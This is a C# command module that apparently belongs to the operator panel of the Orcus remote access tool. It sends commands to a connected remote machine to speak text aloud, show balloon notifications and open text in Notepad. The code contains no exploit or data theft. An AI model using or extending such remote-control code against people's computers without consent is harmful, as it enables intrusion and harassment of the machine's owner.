using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.UserInteraction;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.UserInteraction
{
    [DescribeCommandByEnum(typeof (UserInteractionCommunication))]
    public class UserInteractionCommand : Command
    {
        public event EventHandler<UserInteractionWelcomePackage> Initialized;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((UserInteractionCommunication) parameter[0])
            {
                case UserInteractionCommunication.WelcomePackage:
                    Initialized?.Invoke(this,
                        new Serializer(typeof (UserInteractionWelcomePackage))
                            .Deserialize<UserInteractionWelcomePackage>(parameter, 1));
                    LogService.Receive((string) Application.Current.Resources["ReceivedInformation"]);
                    break;
                case UserInteractionCommunication.SpeakingText:
                    LogService.Receive((string) Application.Current.Resources["SpeakingText"]);
                    break;
                case UserInteractionCommunication.SpeakingFinished:
                    LogService.Receive((string) Application.Current.Resources["TextWasSpoken"]);
                    break;
                case UserInteractionCommunication.OpenedInEditorSuccessfully:
                    LogService.Receive((string) Application.Current.Resources["TextOpenedInNotepad"]);
                    break;
                case UserInteractionCommunication.NotifyIconMessageOpened:
                    LogService.Receive((string) Application.Current.Resources["BalloonToolTipOpened"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void Initialize()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) UserInteractionCommunication.GetWelcomePackage});
            LogService.Send((string) Application.Current.Resources["GetSomeInformation"]);
        }

        public void TextToSpeech(string text, string name, sbyte speed, int volume)
        {
            var data = new List<byte> {(byte) UserInteractionCommunication.TextToSpeech};
            data.AddRange(
                new Serializer(typeof (TextToSpeechPackage)).Serialize(new TextToSpeechPackage
                {
                    Text = text,
                    VoiceName = name,
                    Speed = speed,
                    Volume = volume
                }));
            ConnectionInfo.SendCommand(this, data.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["SpeakText"], volume, speed, name));
        }

        public void NotifyMessage(int timeout, string title, string text, NotifyToolTipIcon icon)
        {
            var data = new List<byte> {(byte) UserInteractionCommunication.NotifyIconMessage, (byte) icon};
            data.AddRange(BitConverter.GetBytes(timeout));
            var titleBinary = Encoding.UTF8.GetBytes(title);
            data.AddRange(BitConverter.GetBytes(titleBinary.Length));
            data.AddRange(titleBinary);
            data.AddRange(Encoding.UTF8.GetBytes(text));
            ConnectionInfo.SendCommand(this, data.ToArray());

            LogService.Send((string) Application.Current.Resources["OpenBalloonToolTip"]);
        }

        public void TopMessage()
        {
        }

        public void OpenInEditor(string text, string title)
        {
            var textBinary = Encoding.UTF8.GetBytes(text);
            var package = new List<byte> {(byte) UserInteractionCommunication.OpenInEditor};
            package.AddRange(BitConverter.GetBytes(textBinary.Length));
            package.AddRange(textBinary);
            package.AddRange(Encoding.UTF8.GetBytes(title));

            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send((string) Application.Current.Resources["OpenInNotepad"]);
        }

        protected override uint GetId()
        {
            return 22;
        }
    }
}